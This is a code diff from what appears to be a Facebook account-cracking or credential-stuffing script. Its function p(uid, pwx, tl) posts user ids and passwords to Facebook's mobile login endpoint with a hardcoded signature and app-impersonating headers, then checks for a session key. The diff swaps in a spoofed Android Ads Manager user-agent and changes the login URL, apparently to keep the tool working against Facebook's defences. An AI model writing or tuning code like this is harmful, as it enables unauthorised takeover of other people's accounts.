@@ -1477,7 +1477,7 @@ def p(uid,pwx,tl):
             'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
             headers = {
             'Host': 'graph.facebook.com',
-            'User-Agent': UBI_(),
+            'User-Agent': '[FBAN/FB4A;FBAV/419.0.0.31459;FBBV/549648855;FBRV/549648855;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo J793V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
             'Accept-Encoding': 'gzip, deflate',
             'Accept': '*/*',
             'Connection': 'keep-alive',
@@ -1492,7 +1492,7 @@ def p(uid,pwx,tl):
             'X-FB-Friendly-Name': 'authenticate',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': '1026'}
-            url = "https://b-api.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
